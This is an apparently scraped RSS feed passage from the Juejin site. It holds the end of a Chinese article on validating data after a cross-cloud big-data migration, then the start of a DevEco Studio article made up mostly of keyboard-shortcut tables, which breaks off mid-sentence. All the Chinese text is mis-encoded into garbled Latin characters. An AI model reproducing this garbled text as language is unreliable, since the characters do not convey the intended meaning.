<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53a09dbc737e4326aaed6b3bb0444ec7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=%2FEEC3Zb20DzZbBtOkJvLUcQiJLQ%3D" alt="14.png" loading="lazy"/></p>
<ul>
<li>å·¥å…·ä¸æŠ¥å‘Šé©±åŠ¨ï¼šä»¥å…ƒåˆéªŒæ•°å¹³å°ä¸ºæ ¸å¿ƒè°ƒåº¦å·¥å…·ï¼Œæ¯æ—¥è‡ªåŠ¨äº§å‡ºéªŒæ•°æŠ¥å‘Šï¼Œé€æ˜åŒ–å±•ç¤ºéªŒè¯è¿›åº¦ä¸ä¸ä¸€è‡´é¡¹ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67b11d1a9e5b45ccb59a3787205ad3a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=SYv4odLJ%2FeoxAfbceqe8%2FiYrWng%3D" alt="15.png" loading="lazy"/></p>
<ul>
<li>é—®é¢˜é—­ç¯ç®¡ç†ï¼šå¯¹å¹³å°å‘ç°åŠä¸“å®¶è¯†åˆ«çš„ä¸ä¸€è‡´é—®é¢˜ï¼Œæ‰§è¡Œâ€œå®šä½ã€è§£å†³ã€è·Ÿè¸ªã€éªŒè¯â€çš„å…¨ç¨‹é—­ç¯ç®¡ç†ï¼Œç¡®ä¿æ‰€æœ‰é—®é¢˜è¢«æ ¹é™¤ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0637a9d8eae94dc1b6cb60e155d84bed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=pTaAhjcSRoypyq9QPbyN360%2FKf4%3D" alt="16.png" loading="lazy"/></p>
<h2 data-id="heading-25">äº”ã€æ€»ç»“</h2>
<p>ç¦»çº¿å¤§æ•°æ®è·¨äº‘è¿ç§»æ˜¯ä¸€é¡¹ç³»ç»Ÿæ€§å·¥ç¨‹ï¼Œä»å‰æœŸè§„åˆ’ã€æ•°æ®è¿ç§»åˆ°åæœŸéªŒè¯ï¼Œæ¯ä¸ªç¯èŠ‚éƒ½ç¯ç¯ç›¸æ‰£ã€ç¼ºä¸€ä¸å¯ã€‚æ•°æ®éªŒè¯ä½œä¸ºè¿ç§»é—­ç¯çš„æœ€åä¸€ç¯ï¼Œä¸ä»…æ˜¯å¯¹è¿ç§»ç»“æœçš„è´¨é‡æŠŠå…³ï¼Œæ›´æ˜¯å¯¹æ•´ä¸ªè¿ç§»ä½“ç³»çš„ä¿¡ä»»èƒŒä¹¦ã€‚é€šè¿‡ç§‘å­¦çš„éªŒè¯ç›®æ ‡è®¾å®šã€åˆç†çš„éªŒè¯ç­–ç•¥è®¾è®¡ä»¥åŠé«˜æ•ˆçš„å·¥å…·ä¸æµç¨‹è½åœ°ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¿éšœæ•°æ®å®Œæ•´æ€§ã€ä¸€è‡´æ€§ä¸å¯ç”¨æ€§çš„åŒæ—¶ï¼Œå¹³è¡¡æ€§èƒ½ä¸æˆæœ¬ï¼Œç¡®ä¿ä¸šåŠ¡å¹³ç¨³è¿‡æ¸¡ã€‚
åœ¨æœ¬æ¬¡è¿ç§»ä¸éªŒè¯è¿‡ç¨‹ä¸­ï¼Œæ¥è‡ªå¤šä¸ªå›¢é˜Ÿçš„åŒäº‹å…±åŒå‚ä¸äº†éªŒæ•°å·¥ä½œã€‚ä»–ä»¬åœ¨éªŒè¯æ–¹æ¡ˆè®¾è®¡ã€å·¥å…·å¼€å‘ã€æ•°æ®æ¯”å¯¹ã€é—®é¢˜å®šä½ä¸ä¿®å¤ç­‰ç¯èŠ‚ä¸­å¯†åˆ‡åä½œï¼Œç¡®ä¿äº†æ•´ä¸ªè¿ç§»è¿‡ç¨‹çš„é«˜æ•ˆä¸å¯é ã€‚æ­£æ˜¯è¿™ç§è·¨å›¢é˜Ÿçš„ååŒä¸ä¸“ä¸šæŠ•å…¥ï¼Œæ„ç­‘äº†æ•°æ®éªŒè¯å·¥ä½œçš„åšå®åº•åº§ï¼Œä¹Ÿä¸ºé¡¹ç›®çš„é¡ºåˆ©æ”¶å®˜æä¾›äº†æœ‰åŠ›ä¿éšœã€‚
åœ¨æ­¤ï¼Œä¹Ÿå‘æ‰€æœ‰å‚ä¸æœ¬æ¬¡è¿ç§»ä¸éªŒæ•°å·¥ä½œçš„å›¢é˜Ÿä¸åŒäº‹è‡´ä»¥è¯šæŒšçš„æ„Ÿè°¢â€”â€”æ­£æ˜¯å¤§å®¶çš„ä¸“ä¸šã€è€å¿ƒä¸åä½œï¼Œè®©å¤æ‚çš„è·¨äº‘è¿ç§»é¡¹ç›®å¾—ä»¥é«˜è´¨é‡è½åœ°ã€‚</p>
<p>ä½œè€…ç®€ä»‹ï¼š</p>
<ol>
<li>æ¨ç§‹å‰ï¼šå¤§æ•°æ®ä¸“å®¶ï¼Œè´Ÿè´£å¤§æ•°æ®ç¦»çº¿è®¡ç®—å¼•æ“ã€OLAPå¼•æ“çš„ç ”å‘ä¸ç»´æŠ¤</li>
<li>é™†æ¬¢å…¸ï¼šèµ„æ·±æ•°æ®ä»“åº“å·¥ç¨‹å¸ˆï¼Œè´§æ‹‰æ‹‰å…¬å…±æ•°æ®ç»„è´Ÿè´£äººï¼Œè‡´åŠ›äºå…¬å…±æ•°æ®å±‚çš„é¡¶å±‚è®¾è®¡ä¸ç»Ÿç­¹å»ºè®¾</li>
<li>é™ˆé“¨ï¼šé«˜çº§å¤§æ•°æ®å·¥ç¨‹å¸ˆï¼Œä¸“æ³¨äºå¤§æ•°æ®å­˜å‚¨æ–¹å‘ï¼Œä¸»è¦è´Ÿè´£å¤§æ•°æ®ç¦»çº¿å­˜å‚¨ã€å‘é‡å­˜å‚¨çš„ç ”å‘å’Œç»´æŠ¤</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[DevEco Studio ä½¿ç”¨æŠ€å·§å…¨é¢è§£æ]]></title>    <link>https://juejin.cn/post/7588999772749627427</link>    <guid>https://juejin.cn/post/7588999772749627427</guid>    <pubDate>2025-12-29T06:24:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588999772749627427" data-draft-id="7588996730772045824" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="DevEco Studio ä½¿ç”¨æŠ€å·§å…¨é¢è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯,å‰ç«¯æ¡†æ¶,HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-29T06:24:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Keya"/> <meta itemprop="url" content="https://juejin.cn/user/870468938379671"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            DevEco Studio ä½¿ç”¨æŠ€å·§å…¨é¢è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/870468938379671/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Keya
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:24:12.000Z" title="Mon Dec 29 2025 06:24:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">DevEco Studio ä½¿ç”¨æŠ€å·§å…¨é¢è§£æ</h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>åœ¨é¸¿è’™ç”Ÿæ€è“¬å‹ƒå‘å±•çš„å½“ä¸‹ï¼ŒDevEco Studioä½œä¸ºåä¸ºæä¾›çš„ä¸€ç«™å¼é›†æˆå¼€å‘ç¯å¢ƒï¼Œä¸“ä¸ºé¸¿è’™æ“ä½œç³»ç»Ÿåº”ç”¨å’ŒæœåŠ¡å¼€å‘è®¾è®¡ã€‚æŒæ¡å…¶ä½¿ç”¨æŠ€å·§ï¼Œèƒ½å¤Ÿå¤§å¹…æå‡å¼€å‘æ•ˆç‡ï¼Œè®©å¼€å‘è€…æ›´åŠ ä¸“æ³¨äºåº”ç”¨çš„åˆ›æ–°å’Œå®ç°ã€‚æœ¬æ–‡å°†ä»å¿«æ·é”®ã€å®ç”¨åŠŸèƒ½ã€ç•Œé¢æ“ä½œç­‰å¤šä¸ªæ–¹é¢ï¼Œä¸ºä½ è¯¦ç»†ä»‹ç»DevEco Studioçš„ä½¿ç”¨æŠ€å·§ã€‚</p>
<h3 data-id="heading-2">å¿«æ·é”®å¤§å…¨</h3>
<h4 data-id="heading-3">ç¼–è¾‘ç±»å¿«æ·é”®</h4>
<p>ç¼–è¾‘æ˜¯å¼€å‘è¿‡ç¨‹ä¸­æœ€é¢‘ç¹çš„æ“ä½œï¼Œä»¥ä¸‹å¿«æ·é”®èƒ½è®©ä»£ç ç¼–å†™ã€ä¿®æ”¹æ›´æµç•…ï¼š</p>





























































































































<table><thead><tr><th>å¿«æ·é”®(Win)</th><th>å¿«æ·é”®ï¼ˆMacï¼‰</th><th>ä¸­æ–‡è¯´æ˜</th></tr></thead><tbody><tr><td>Alt + J</td><td>^G</td><td>é€‰æ‹©ç›¸åŒè¯ï¼Œè®¾ç½®å¤šä¸ªå…‰æ ‡ã€‚ï¼ˆå¸¸ç”¨ï¼Œæ‰¹é‡é€‰ä¸­ï¼‰</td></tr><tr><td>Alt + 1</td><td>âŒ˜1</td><td>æ˜¾ç¤º æˆ– éšè— é¡¹ç›®åŒºã€‚ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Ctrl + E</td><td>âŒ˜E</td><td>æœ€è¿‘çš„æ–‡ä»¶ï¼ˆå¸¸ç”¨ï¼Œåˆ‡æ¢æ–‡ä»¶ã€åˆ‡æ¢é¢æ¿ï¼Œå¼ºçƒˆæ¨èï¼‰</td></tr><tr><td>Ctrl + P</td><td>âŒ˜P</td><td>å±•ç¤ºæ–¹æ³•çš„å‚æ•°ä¿¡æ¯ã€‚ï¼ˆå¸¸ç”¨ï¼Œç±»å‹æç¤ºç¥å™¨ï¼‰</td></tr><tr><td>Ctrl + Q</td><td>æ— </td><td>å±•ç¤ºç»„ä»¶çš„ API è¯´æ˜æ–‡æ¡£ã€‚ï¼ˆå¸¸ç”¨ï¼ŒæŸ¥æ–‡æ¡£ç¥å™¨ï¼‰</td></tr><tr><td>Ctrl + Alt + L</td><td>âŒ¥âŒ˜L</td><td>æ ¼å¼åŒ–ä»£ç  ã€‚ï¼ˆæ¨èè®¾ç½®ä¿å­˜è‡ªåŠ¨æ ¼å¼åŒ–ï¼‰</td></tr><tr><td>Shift + Enter</td><td>â‡§â†©</td><td>æ¢è¡Œè¾“å…¥ã€‚ï¼ˆå¸¸ç”¨ï¼Œæ¢è¡Œæ·»åŠ æ–°å±æ€§ï¼‰</td></tr><tr><td>Ctrl + å•å‡» / Ctrl + B</td><td>âŒ˜å•å‡» / âŒ˜B</td><td>è·³è½¬æºç ã€è·³è½¬æ–‡ä»¶ã€‚ï¼ˆå¸¸ç”¨ï¼Œå¼ºçƒˆæ¨èï¼‰</td></tr><tr><td>Ctrl + Alt + T</td><td>âŒ¥âŒ˜T</td><td>è‡ªåŠ¨ç”Ÿæˆå…·æœ‰ç¯ç»•æ€§è´¨çš„ä»£ç ã€‚ï¼ˆæ¨èï¼Œç”Ÿæˆ <code>ifâ€¦else,tryâ€¦catch</code> ç­‰ä»£ç å—ï¼‰</td></tr><tr><td>Ctrl + /</td><td>âŒ˜/</td><td>å•è¡Œæ³¨é‡Š <code>//</code> ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Ctrl + Shift + /</td><td>âŒ¥âŒ˜/</td><td>ä»£ç å—æ³¨é‡Š <code>/**/</code> ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Tab / Shift + Tab</td><td>Tab / â‡§Tab</td><td>ç¼©è¿›æˆ–è€…ä¸ç¼©è¿›ä¸€æ¬¡æ‰€é€‰æ‹©çš„ä»£ç æ®µã€‚ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Ctrl + X</td><td>âŒ˜X</td><td>å‰ªåˆ‡é€‰ä¸­ä»£ç ã€å‰ªåˆ‡è¡Œã€åˆ é™¤è¡Œã€‚ ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Ctrl + C</td><td>âŒ˜C</td><td>å¤åˆ¶é€‰ä¸­ä»£ç ã€å¤åˆ¶è¡Œã€‚ ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Ctrl + D</td><td>âŒ˜D</td><td>å¤å°é€‰ä¸­ä»£ç ã€å¤å°è¡Œã€‚ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Ctrl + V</td><td>âŒ˜V</td><td>ç²˜è´´ä»£ç ã€‚ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Ctrl + Shift + V</td><td>â‡§âŒ˜V</td><td>å‰ªè´´æ¿ï¼Œå¤åˆ¶è¿‡çš„å†…å®¹éƒ½åœ¨è¿™é‡Œã€‚ï¼ˆæ¨èï¼‰</td></tr><tr><td>Ctrl + Z</td><td>âŒ˜Z</td><td>æ’¤æ¶ˆã€‚ï¼ˆå¸¸ç”¨ï¼‰</td></tr><tr><td>Ctrl + Shift + Z / Ctrl + Y</td><td>â‡§âŒ˜Z</td><td>é‡åšã€‚</td></tr><tr><td>Ctrl + Shift + J</td><td>^â‡§J</td><td>æŠŠä¸‹ä¸€è¡Œçš„ä»£ç æ¥ç»­åˆ°å½“å‰çš„ä»£ç è¡Œã€‚ï¼ˆå¸¸ç”¨ï¼Œåˆå¹¶è¡Œï¼‰</td></tr><tr><td>Ctrl + Shift + U</td><td>â‡§âŒ˜U</td><td>åˆ‡æ¢å¤§å°å†™ã€‚ï¼ˆæ¨èï¼‰</td></tr><tr><td>Ctrl + (+/-)</td><td>âŒ˜+ / âŒ˜-</td><td>æŠ˜å æˆ–å±•å¼€ä»£ç ã€‚ ï¼ˆæ¨èï¼‰</td></tr><tr><td>Shift + F6</td><td>â‡§F6</td><td>é‡æ„ä¿®æ”¹å‘½åã€‚ï¼ˆå¸¸ç”¨ï¼Œèƒ½åŒæ­¥æ›´æ–°è·¯å¾„ã€å˜é‡åã€å‡½æ•°åçš„é‡å‘½åï¼‰</td></tr></tbody></table>
<h4 data-id="heading-4">æŸ¥æ‰¾ä¸æ›¿æ¢å¿«æ·é”®</h4>
<p>é«˜æ•ˆçš„æŸ¥æ‰¾å’Œæ›¿æ¢èƒ½å‡å°‘é‡å¤åŠ³åŠ¨ï¼Œæå‡ä»£ç ç»´æŠ¤æ•ˆç‡ï¼š</p>



































<table><thead><tr><th>å¿«æ·é”®(Win)</th><th>å¿«æ·é”®ï¼ˆMacï¼‰</th><th>ä¸­æ–‡è¯´æ˜</th></tr></thead><tbody><tr><td>Ctrl + F</td><td>âŒ˜F</td><td>åœ¨å½“å‰æ–‡ä»¶ä¸­æŸ¥æ‰¾</td></tr><tr><td>Ctrl + R</td><td>âŒ˜R</td><td>æ›¿æ¢æ–‡æœ¬</td></tr><tr><td>Ctrl + Shift + F</td><td>â‡§âŒ˜F</td><td>åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾</td></tr><tr><td>Ctrl + Shift + R</td><td>â‡§âŒ˜R</td><td>åœ¨æ–‡ä»¶ä¸­æ›¿æ¢</td></tr><tr><td>Shift + Shift</td><td>Shift + Shift</td><td>å¿«é€ŸæŸ¥æ‰¾</td></tr></tbody></table>
<h4 data-id="heading-5">ç¼–è¯‘ä¸è¿è¡Œå¿«æ·é”®</h4>
<p>ç¼–è¯‘å’Œè¿è¡Œæ˜¯å¼€å‘è¿‡ç¨‹ä¸­çš„å…³é”®æ­¥éª¤ï¼Œè¿™äº›å¿«æ·é”®è®©æ“ä½œæ›´é«˜æ•ˆï¼š</p>






























<table><thead><tr><th>å¿«æ·é”®(Win)</th><th>å¿«æ·é”®ï¼ˆMacï¼‰</th><th>ä¸­æ–‡è¯´æ˜</th></tr></thead><tbody><tr><td>Shift + F10</td><td>^R</td><td>è¿è¡Œ entryã€‚ ï¼ˆå¸¸ç”¨ï¼Œç‰¹åˆ«å¥½ç”¨ï¼‰</td></tr><tr><td>Shift + F9</td><td>^D</td><td>è°ƒè¯• entryã€‚</td></tr><tr><td>Alt + Shift + F10</td><td>^âŒ¥D</td><td>ä¼šæ‰“å¼€ä¸€ä¸ªå·²ç»é…ç½®çš„è¿è¡Œåˆ—è¡¨ï¼Œè®©ä½ é€‰æ‹©ä¸€ä¸ªåï¼Œå†è¿è¡Œã€‚</td></tr><tr><td>Alt + Shift + F9</td><td>^âŒ¥D</td><td>ä¼šæ‰“å¼€ä¸€ä¸ªå·²ç»é…ç½®çš„è¿è¡Œåˆ—è¡¨ï¼Œè®©ä½ é€‰æ‹©ä¸€ä¸ªåï¼Œå†ä»¥è°ƒè¯•æ¨¡å¼è¿è¡Œã€‚</td></tr></tbody></table>
<h4 data-id="heading-6">è°ƒè¯•å¿«æ·é”®</h4>
<p>é«˜æ•ˆçš„è°ƒè¯•èƒ½åŠ›æ˜¯è§£å†³é—®é¢˜çš„å…³é”®ï¼Œä»¥ä¸‹æ˜¯å¸¸ç”¨çš„è°ƒè¯•å¿«æ·é”®ï¼š</p>

































<table><thead><tr><th>å¿«æ·é”®</th><th>ä¸­æ–‡è¯´æ˜</th></tr></thead><tbody><tr><td>F8</td><td>æ­¥è¿‡ï¼ˆæ‰§è¡Œä¸‹ä¸€è¡Œï¼Œä¸è¿›å…¥æ–¹æ³•ï¼‰</td></tr><tr><td>F7</td><td>æ­¥å…¥ï¼ˆè¿›å…¥è°ƒç”¨çš„æ–¹æ³•ï¼‰</td></tr><tr><td>Alt + F9</td><td>è¿è¡Œåˆ°å…‰æ ‡å¤„</td></tr><tr><td>Alt + F8</td><td>è¯„ä¼°è¡¨è¾¾å¼</td></tr><tr><td>F9</td><td>æ¢å¤ç¨‹åºè¿è¡Œï¼ˆè·³åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼‰</td></tr><tr><td>Ctrl + Shift + F8</td><td>æŸ¥çœ‹æ–­ç‚¹</td></tr></tbody></table>
<h3 data-id="heading-7">å®ç”¨åŠŸèƒ½ä»‹ç»</h3>
<h4 data-id="heading-8">ä»£ç é«˜äº®</h4>
<p>ä»£ç é«˜äº®åŠŸèƒ½å¯ä»¥è®©ä»£ç ä¸­çš„å…³é”®ç±»ã€è¿ç®—ç¬¦ã€å­—ç¬¦ä¸²ç­‰é‡è¦éƒ¨åˆ†ä»¥é«˜äº®å½¢å¼å‘ˆç°ã€‚åœ¨DevEco Studioä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„è®¾ç½®æ¥è‡ªå®šä¹‰é«˜äº®æ˜¾ç¤ºã€‚æ‰“å¼€ <code>File &gt; Settings</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ– <code>DevEco Studio &gt; Preferences</code> ï¼ˆmacOSç³»ç»Ÿï¼‰ï¼Œç„¶åæ‰¾åˆ°<code>Editor &gt; Code Style</code> é€‰é¡¹ï¼Œåœ¨è¿™é‡Œå¯ä»¥è‡ªå®šä¹‰å„å­—æ®µçš„é«˜äº®æ˜¾ç¤ºé¢œè‰²ã€‚</p>
<h4 data-id="heading-9">ä»£ç è·³è½¬</h4>
<p>åœ¨é˜…è¯»å’Œç¼–è¾‘å¤æ‚ä»£ç æ—¶ï¼Œå¿«é€Ÿå®šä½å‡½æ•°ã€æ–¹æ³•ç­‰å®šä¹‰çš„ä½ç½®è‡³å…³é‡è¦ã€‚DevEco Studioæä¾›äº†ä¾¿æ·çš„ä»£ç è·³è½¬åŠŸèƒ½ã€‚åªéœ€ä½¿ç”¨å¿«æ·é”®<code>Ctrl</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ– <code>Command</code> ï¼ˆmacOSç³»ç»Ÿï¼‰å¹¶é…åˆé¼ æ ‡å•å‡»ï¼Œå°±èƒ½ç›´æ¥è·³è½¬åˆ°ä»£ç ä¸­å¼•ç”¨çš„ç›®æ ‡å®šä¹‰å¤„ã€‚è€Œä¸”ï¼Œå½“å­˜åœ¨å¤šä¸ªå¼•ç”¨ç›®æ ‡æ—¶ï¼Œè¿˜ä¼šå¼¹å‡ºé€‰æ‹©çª—å£ï¼Œæ–¹ä¾¿æˆ‘ä»¬å‡†ç¡®æ‰¾åˆ°æƒ³è¦æŸ¥çœ‹çš„å®šä¹‰ã€‚</p>
<h4 data-id="heading-10">è·¨è¯­è¨€è·³è½¬</h4>
<p>å¯¹äºæ¶‰åŠè·¨è¯­è¨€å¼€å‘ï¼Œç‰¹åˆ«æ˜¯å£°æ˜è°ƒç”¨äº†Nativeæ¥å£çš„é¡¹ç›®ï¼ŒDevEco Studioçš„è·¨è¯­è¨€è·³è½¬åŠŸèƒ½ååˆ†å®ç”¨ã€‚åœ¨ä»£ç ä¸­é€‰ä¸­ç›¸å…³è°ƒç”¨ï¼Œç„¶åé€‰æ‹© <code>Go To &gt; Implementation(C++)</code> ï¼Œå°±èƒ½è¿…é€Ÿè·³è½¬åˆ°å¯¹åº”çš„C++å®ç°ä»£ç å¤„ã€‚è¿™ä¸€åŠŸèƒ½æå¤§åœ°æé«˜äº†è”åˆå¼€å‘æ—¶ä¸åŒè¯­è¨€ä»£ç ä¹‹é—´çš„åˆ‡æ¢å’ŒæŸ¥é˜…æ•ˆç‡ï¼Œå‡å°‘äº†åœ¨ä¸åŒæ–‡ä»¶å’Œè¯­è¨€ä¹‹é—´åˆ‡æ¢çš„ç¹çæ“ä½œã€‚</p>
<h4 data-id="heading-11">ä»£ç æ ¼å¼åŒ–</h4>
<p>ä»£ç æ ¼å¼åŒ–åŠŸèƒ½å¯ä»¥å¸®æˆ‘ä»¬å¿«é€Ÿæ•´ç†ä»£ç çš„ç¼©è¿›å’Œç»“æ„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå·²ç»æœ‰ä¸€å¥—ä»£ç æ ¼å¼åŒ–é…ç½®ï¼Œä½†æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½è¿›è¡Œè°ƒæ•´ã€‚é€šè¿‡<code>File &gt; Settings</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ– <code>DevEco Studio &gt; Preferences</code> ï¼ˆmacOSç³»ç»Ÿï¼‰è¿›å…¥<code>Editor &gt; Code Style</code> ï¼Œåœ¨è¿™é‡Œå¯ä»¥è®¾ç½®å„ç§æ ¼å¼åŒ–è§„åˆ™ã€‚ä½¿ç”¨å¿«æ·é”®<code>Ctrl + Alt + L</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ– <code>Option + Command + L</code> ï¼ˆmacOSç³»ç»Ÿï¼‰ï¼Œå°±èƒ½å¯¹é€‰å®šçš„ä»£ç è¿›è¡Œæ 